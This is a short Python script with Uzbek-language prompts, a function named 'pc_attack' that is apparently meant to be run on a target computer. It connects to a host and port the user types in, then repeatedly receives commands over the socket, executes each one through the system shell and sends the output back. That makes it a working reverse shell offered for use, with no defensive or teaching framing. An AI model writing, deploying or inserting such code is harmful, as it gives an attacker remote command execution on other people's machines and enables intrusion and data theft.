import socket
import sys
import subprocess

def pc_attack():

    server = socket.socket()
    print("[INFO] Har kim qilayotgan ishiga o'zi javob beradi!")
    host = input("Kompyuterdi IP sini yozing: ")
    port = int(input("Portini kiriting: "))

    try:
        server.connect((host, port))
    except socket.gaierror:
        print("[ERROR] No internet connection")
        sys.exit()
    except OSError:
        print("[ERROR] Connection failed")
        sys.exit()

    run = True
    while run:
        try:
            xabar = server.recv(1024)
            if not xabar:
                break

            buyruq = xabar.decode('UTF-8').strip()
            if buyruq.lower() in ['exit', 'quit']:
                print("[INFO] Server buyruqni yakunlashni talab qildi.")
                run = False
                continue

            # Buyruqni bajaring va natijani oling
            result = subprocess.run(buyruq, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr

            if not output:
                output = 'No output from the command.'

            server.send(output.encode('UTF-8'))
        except Exception as e:
            print(f"[ERROR] An error occurred: {e}")
            server.send(f"[ERROR] An error occurred: {e}".encode('UTF-8'))
            run = False

    server.close()